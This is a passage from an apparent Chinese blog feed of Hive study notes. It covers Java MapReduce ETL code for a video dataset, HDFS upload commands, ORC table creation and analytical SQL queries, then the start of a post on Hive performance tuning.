punctuation">;</span>​          resultData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>datas<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​          resultData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>datas<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>​      <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​        <span class="token comment" spellcheck="true">//4.2 有关联视频的情况</span>​        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> datas<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​          resultData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>datas<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​          resultData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>datas<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>​      <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>​    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>​    <span class="token keyword">return</span> resultData<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）ETL之Mapper</p><pre class="line-numbers language-java"><code class="language-java">  <span class="token comment" spellcheck="true">/** \* 清洗谷粒影音的原始数据 \* 清洗规则 \* 1. 将数据长度小于9的清洗掉 \*  2. 将数据中的视频类别中间的空格去掉  People &amp; Blogs \* 3. 将数据中的关联视频id通过&amp;符号拼接 */</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EtlMapper</span> <span class="token keyword">extends</span> <span class="token class-name">Mapper</span><span class="token operator">&lt;</span>LongWritable<span class="token punctuation">,</span> Text<span class="token punctuation">,</span>Text<span class="token punctuation">,</span> NullWritable<span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>   <span class="token keyword">private</span> Text k <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token annotation punctuation">@Override</span>   <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">map</span><span class="token punctuation">(</span>LongWritable key<span class="token punctuation">,</span> Text value<span class="token punctuation">,</span> Context context<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//获取一行</span>     String line <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//清洗</span>     String resultData <span class="token operator">=</span> ETLUtil<span class="token punctuation">.</span><span class="token function">etlData</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>​     <span class="token keyword">if</span><span class="token punctuation">(</span>resultData <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​       <span class="token comment" spellcheck="true">//写出</span>​       k<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>resultData<span class="token punctuation">)</span><span class="token punctuation">;</span>​       context<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>NullWritable<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​     <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>   <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）ETL之Driver</p><pre class="line-numbers language-java"><code class="language-java"> <span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>gulivideo<span class="token punctuation">.</span>etl<span class="token punctuation">;</span> <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>conf<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span> <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>Path<span class="token punctuation">;</span> <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>NullWritable<span class="token punctuation">;</span> <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span> <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Job<span class="token punctuation">;</span> <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>input<span class="token punctuation">.</span>FileInputFormat<span class="token punctuation">;</span> <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>output<span class="token punctuation">.</span>FileOutputFormat<span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EtlDriver</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>     Configuration conf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     Job job <span class="token operator">=</span> Job<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>conf<span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">setJarByClass</span><span class="token punctuation">(</span>EtlDriver<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">setMapperClass</span><span class="token punctuation">(</span>EtlMapper<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">setMapOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">setMapOutputValueClass</span><span class="token punctuation">(</span>NullWritable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">setOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">setOutputValueClass</span><span class="token punctuation">(</span>NullWritable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">setNumReduceTasks</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     FileInputFormat<span class="token punctuation">.</span><span class="token function">setInputPaths</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     FileOutputFormat<span class="token punctuation">.</span><span class="token function">setOutputPath</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">waitForCompletion</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4）将ETL程序打包为etl.jar 并上传到Linux的 /opt/module/hive/datas 目录下</p><p>5）上传原始数据到HDFS</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span> <span class="token function">pwd</span>/opt/module/hive/datas<span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span> hadoop fs -mkdir -p /gulivideo/video<span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span> hadoop fs -mkdir -p /gulivideo/user<span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span> hadoop fs -put gulivideo/user/user.txt  /gulivideo/user<span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span> hadoop fs -put gulivideo/video/*.txt  /gulivideo/video<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>6）ETL数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span> hadoop jar  etl.jar  com.molly.hive.etl.EtlDriver /gulivideo/video /gulivideo/video/output<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-准备表"><a href="#3-2-准备表" class="headerlink" title="3.2 准备表"></a>3.2 准备表</h3><p>1）需要准备的表</p><p><strong>因为我们想要创建压缩表，但是压缩表不能直接导入数据，因此我们采用两个中转表（原始表），然后从原始表导入压缩表（最终表）。</strong></p><p>创建原始数据表：gulivideo_ori，gulivideo_user_ori，</p><p>创建最终表：gulivideo_orc，gulivideo_user_orc</p><p>2）创建原始数据表：</p><p>  （1）gulivideo_ori</p><pre class="line-numbers language-bash"><code class="language-bash">create table gulivideo_ori<span class="token punctuation">(</span>  videoId string,   uploader string,   age int,   category array<span class="token operator">&lt;</span>string<span class="token operator">></span>,   length int,   views int,   rate float,   ratings int,   comments int,  relatedId array<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">"\t"</span>collection items terminated by <span class="token string">"&amp;"</span>stored as textfile<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）创建原始数据表: gulivideo_user_ori</p><pre class="line-numbers language-bash"><code class="language-bash">create table gulivideo_user_ori<span class="token punctuation">(</span>  uploader string,  videos int,  friends int<span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">"\t"</span> stored as textfile<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1） 创建orc存储格式带snappy压缩的表：</p><p>（1）gulivideo_orc</p><pre class="line-numbers language-bash"><code class="language-bash">create table gulivideo_orc<span class="token punctuation">(</span>  videoId string,   uploader string,   age int,   category array<span class="token operator">&lt;</span>string<span class="token operator">></span>,   length int,   views int,   rate float,   ratings int,   comments int,  relatedId array<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token punctuation">)</span>stored as orctblproperties<span class="token punctuation">(</span><span class="token string">"orc.compress"</span><span class="token operator">=</span><span class="token string">"SNAPPY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）gulivideo_user_orc</p><pre class="line-numbers language-bash"><code class="language-bash">create table gulivideo_user_orc<span class="token punctuation">(</span>  uploader string,  videos int,  friends int<span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">"\t"</span> stored as orctblproperties<span class="token punctuation">(</span><span class="token string">"orc.compress"</span><span class="token operator">=</span><span class="token string">"SNAPPY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）向ori表插入数据</p><pre class="line-numbers language-bash"><code class="language-bash">load data inpath <span class="token string">"/gulivideo/video/output"</span> into table gulivideo_ori<span class="token punctuation">;</span>load data inpath <span class="token string">"/gulivideo/user"</span> into table gulivideo_user_ori<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（4）向orc表插入数据</p><pre class="line-numbers language-bash"><code class="language-bash">insert into table gulivideo_orc <span class="token keyword">select</span> * from gulivideo_ori<span class="token punctuation">;</span>insert into table gulivideo_user_orc <span class="token keyword">select</span> * from gulivideo_user_ori<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-业务分析"><a href="#4-业务分析" class="headerlink" title="4 业务分析"></a>4 业务分析</h2><h3 id="4-1-统计视频观看数Top10"><a href="#4-1-统计视频观看数Top10" class="headerlink" title="4.1 统计视频观看数Top10"></a>4.1 统计视频观看数Top10</h3><p>思路：使用order by按照views字段做一个全局排序即可，同时我们设置只显示前10条。</p><p>最终代码：</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT videoId,views FROM gulivideo_orcORDER BY views DESC LIMIT 10<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-统计视频类别热度Top10"><a href="#4-2-统计视频类别热度Top10" class="headerlink" title="4.2 统计视频类别热度Top10"></a>4.2 统计视频类别热度Top10</h3><p>思路：</p><p>（1）即统计每个类别有多少个视频，显示出包含视频最多的前10个类别。</p><p>（2）我们需要按照类别group by聚合，然后count组内的videoId个数即可。</p><p>（3）因为当前表结构为：一个视频对应一个或多个类别。所以如果要group by类别，需要先将类别进行列转行(展开)，然后再进行count即可。</p><p>（4）最后按照热度排序，显示前10条。</p><p>最终代码：</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT   t1.category_name , COUNT<span class="token punctuation">(</span>t1.videoId<span class="token punctuation">)</span> hotFROM <span class="token punctuation">(</span>SELECT videoId, category_name FROM gulivideo_orc lateral VIEW explode<span class="token punctuation">(</span>category<span class="token punctuation">)</span> gulivideo_orc_tmp AS category_name<span class="token punctuation">)</span> t1GROUP BY t1.category_name ORDER BY hot DESC LIMIT 10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-3-统计出视频观看数最高的20个视频的所属类别以及类别包含Top20视频的个数"><a href="#4-3-统计出视频观看数最高的20个视频的所属类别以及类别包含Top20视频的个数" class="headerlink" title="4.3 统计出视频观看数最高的20个视频的所属类别以及类别包含Top20视频的个数"></a>4.3 统计出视频观看数最高的20个视频的所属类别以及类别包含Top20视频的个数</h3><p>思路：</p><p>（1）先找到观看数最高的20个视频所属条目的所有信息，降序排列</p><p>（2）把这20条信息中的category分裂出来(列转行)</p><p>（3）最后查询视频分类名称和该分类下有多少个Top20的视频</p><p>最终代码：</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT  t2.category_name, COUNT<span class="token punctuation">(</span>t2.videoId<span class="token punctuation">)</span> video_sum FROM  <span class="token punctuation">(</span> SELECT  t1.videoId,  category_name FROM  <span class="token punctuation">(</span> SELECT  videoId,  views , category  FROM  gulivideo_orc ORDER BY  views  DESC  LIMIT 20 <span class="token punctuation">)</span> t1lateral VIEW explode<span class="token punctuation">(</span>t1.category<span class="token punctuation">)</span> t1_tmp AS category_name<span class="token punctuation">)</span> t2GROUP BY t2.category_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-4-统计视频观看数Top50所关联视频的所属类别排序"><a href="#4-4-统计视频观看数Top50所关联视频的所属类别排序" class="headerlink" title="4.4 统计视频观看数Top50所关联视频的所属类别排序"></a>4.4 统计视频观看数Top50所关联视频的所属类别排序</h3><p>代码：</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT t6.category_name, t6.video_sum, rank<span class="token punctuation">(</span><span class="token punctuation">)</span> over<span class="token punctuation">(</span>ORDER BY t6.video_sum DESC <span class="token punctuation">)</span> rkFROM <span class="token punctuation">(</span> SELECT t5.category_name, COUNT<span class="token punctuation">(</span>t5.relatedid_id<span class="token punctuation">)</span> video_sum FROM <span class="token punctuation">(</span> SELECT t4.relatedid_id, category_name FROM <span class="token punctuation">(</span> SELECT   t2.relatedid_id , t3.category   FROM  <span class="token punctuation">(</span> SELECT   relatedid_id FROM  <span class="token punctuation">(</span> SELECT  videoId,   views, relatedid  FROM  gulivideo_orc ORDER BY views  DESC  LIMIT 50 <span class="token punctuation">)</span>t1 lateral VIEW explode<span class="token punctuation">(</span>t1.relatedid<span class="token punctuation">)</span> t1_tmp AS relatedid_id <span class="token punctuation">)</span>t2  JOIN   gulivideo_orc t3  ON   t2.relatedid_id <span class="token operator">=</span> t3.videoId <span class="token punctuation">)</span> t4 lateral VIEW explode<span class="token punctuation">(</span>t4.category<span class="token punctuation">)</span> t4_tmp AS category_name<span class="token punctuation">)</span> t5GROUP BY t5.category_nameORDER BY  video_sum DESC <span class="token punctuation">)</span> t6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-5-统计每个类别中的视频热度Top10，以Music为例"><a href="#4-5-统计每个类别中的视频热度Top10，以Music为例" class="headerlink" title="4.5 统计每个类别中的视频热度Top10，以Music为例"></a>4.5 统计每个类别中的视频热度Top10，以Music为例</h3><p>思路：</p><p>（1）要想统计Music类别中的视频热度Top10，需要先找到Music类别，那么就需要将category展开，所以可以创建一张表用于存放categoryId展开的数据。</p><p>（2）向category展开的表中插入数据。</p><p>（3）统计对应类别（Music）中的视频热度。</p><p>统计Music类别的Top10（也可以统计其他）</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT t1.videoId,  t1.views, t1.category_name FROM  <span class="token punctuation">(</span> SELECT  videoId, views, category_name FROM gulivideo_orc lateral VIEW explode<span class="token punctuation">(</span>category<span class="token punctuation">)</span> gulivideo_orc_tmp AS category_name <span class="token punctuation">)</span>t1   WHERE   t1.category_name <span class="token operator">=</span> <span class="token string">"Music"</span>  ORDER BY   t1.views DESC LIMIT 10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-6-统计每个类别视频观看数Top10"><a href="#4-6-统计每个类别视频观看数Top10" class="headerlink" title="4.6 统计每个类别视频观看数Top10"></a>4.6 统计每个类别视频观看数Top10</h3><p>最终代码：</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT   t2.videoId, t2.views,  t2.category_name,  t2.rkFROM <span class="token punctuation">(</span>SELECT  t1.videoId,  t1.views, t1.category_name,rank<span class="token punctuation">(</span><span class="token punctuation">)</span> over<span class="token punctuation">(</span>PARTITION BY t1.category_name ORDER BY t1.views DESC <span class="token punctuation">)</span> rkFROM  <span class="token punctuation">(</span>SELECT videoId, views,  category_nameFROM gulivideo_orclateral VIEW explode<span class="token punctuation">(</span>category<span class="token punctuation">)</span> gulivideo_orc_tmp AS category_name<span class="token punctuation">)</span>t1<span class="token punctuation">)</span>t2WHERE t2.rk <span class="token operator">&lt;=</span>10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-7-统计上传视频最多的用户Top10以及他们上传的视频观看次数在前20的视频"><a href="#4-7-统计上传视频最多的用户Top10以及他们上传的视频观看次数在前20的视频" class="headerlink" title="4.7 统计上传视频最多的用户Top10以及他们上传的视频观看次数在前20的视频"></a>4.7 统计上传视频最多的用户Top10以及他们上传的视频观看次数在前20的视频</h3><p>思路：</p><p>（1）求出上传视频最多的10个用户</p><p>（2）关联gulivideo_orc表，求出这10个用户上传的所有的视频，按照观看数取前20</p><p>最终代码:</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT  t2.videoId,  t2.views,  t2.uploaderFROM<span class="token punctuation">(</span> SELECT  uploader, videos FROM gulivideo_user_orc  ORDER BY  videos DESC LIMIT 10   <span class="token punctuation">)</span> t1 JOIN gulivideo_orc t2  ON t1.uploader <span class="token operator">=</span> t2.uploader ORDER BY   t2.views  DESC LIMIT 20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hive/">Hive</category>
      
      
      <comments>https://m01ly.github.io/2020/11/15/bigdata-hive5-example/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hive学习笔记（四） Hive的企业级调优</title>
      <link>https://m01ly.github.io/2020/11/15/bigdata-hive4-optimize/</link>
      <guid>https://m01ly.github.io/2020/11/15/bigdata-hive4-optimize/</guid>
      <pubDate>Sun, 15 Nov 2020 07:45:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>对于Hive的操作是面对大数据层面，因此对于查询效率是有要求的，这篇主要从以下几个方面进行调优。</p><p>总结:优化：<br>1 设置抓取为more:set hive.fetch.task.conversion=more;<br>2 开启本地模式:配置小数据量放到本地跑<br>set hive.exec.mode.local.auto=true;  //开启本地mr<br>//设置local mr的最大输入数据量，当输入数据量小于这个值时采用local  mr的方式，默认为134217728，即128M<br>set hive.exec.mode.local.auto.inputbytes.max=50000000;<br>//设置local mr的最大输入文件个数，当输入文件个数小于这个值时采用local mr的方式，默认为4<br>set hive.exec.mode.local.auto.input.files.max=10;</p><h1 id="1-执行计划（Explain）"><a href="#1-执行计划（Explain）" class="headerlink" title="1 执行计划（Explain）"></a>1 执行计划（Explain）</h1><p>explain很详细的看到语句执行过程中发生的事情。</p><h2 id="1-1基本语法"><a href="#1-1基本语法" class="headerlink" title="1.1基本语法"></a>1.1基本语法</h2><p>EXPLAIN [EXTENDED | DEPENDENCY | AUTHORIZATION] query</p><p>Explain主要是分析一下sql的执行过程。</p><h2 id="1-2-案例实操"><a href="#1-2-案例实操" class="headerlink" title="1.2 案例实操"></a>1.2 案例实操</h2><p>（1）查看下面这条语句的执行计划</p><p>没有生成MR任务的</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> explain <span class="token keyword">select</span> * from emp<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有生成MR任务的</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> explain <span class="token keyword">select</span> deptno, avg<span class="token punctuation">(</span>sal<span class="token punctuation">)</span> avg_sal from emp group by deptno<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）查看详细执行计划</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> explain extended <span class="token keyword">select</span> * from emp<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> explain extended <span class="token keyword">select</span> deptno, avg<span class="token punctuation">(</span>sal<span class="token punctuation">)</span> avg_sal from emp group by deptno<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="2-Fetch抓取"><a href="#2-Fetch抓取" class="headerlink" title="2 Fetch抓取"></a>2 Fetch抓取</h1><p>Fetch抓取是指，Hive中对某些情况的查询可以不必使用MapReduce计算。例如：SELECT * FROM employees;在这种情况下，Hive可以简单地读取employee对应的存储目录下的文件，然后输出查询结果到控制台。</p><p>在hive-default.xml.template文件中hive.fetch.task.conversion默认是more，老版本hive默认是minimal，该属性修改为more以后，在全局查找、字段查找、limit查找等都不走mapreduce。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>property<span class="token operator">></span>  <span class="token operator">&lt;</span>name<span class="token operator">></span>hive.fetch.task.conversion<span class="token operator">&lt;</span>/name<span class="token operator">></span>  <span class="token operator">&lt;</span>value<span class="token operator">></span>more<span class="token operator">&lt;</span>/value<span class="token operator">></span>  <span class="token operator">&lt;</span>description<span class="token operator">></span>   Expects one of <span class="token punctuation">[</span>none, minimal, more<span class="token punctuation">]</span>.   Some <span class="token keyword">select</span> queries can be converted to single FETCH task minimizing latency.   Currently the query should be single sourced not having any subquery and should not have any aggregations or distincts <span class="token punctuation">(</span>which incurs RS<span class="token punctuation">)</span>, lateral views and joins.   \0. none <span class="token keyword">:</span> disable hive.fetch.task.conversion   \1. minimal <span class="token keyword">:</span> SELECT STAR, FILTER on partition columns, LIMIT only   \2. <span class="token function">more</span> <span class="token keyword">:</span> SELECT, FILTER, LIMIT only <span class="token punctuation">(</span>support TABLESAMPLE and virtual columns<span class="token punctuation">)</span>  <span class="token operator">&lt;</span>/description<span class="token operator">></span><span class="token operator">&lt;</span>/property<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-1-案例实操："><a href="#2-1-案例实操：" class="headerlink" title="2.1 案例实操："></a>2.1 案例实操：</h2><p>（1）把hive.fetch.task.conversion设置成none，然后执行查询语句，都会执行mapreduce程序。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> hive.fetch.task.conversion<span class="token operator">=</span>none<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> ename from emp<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span 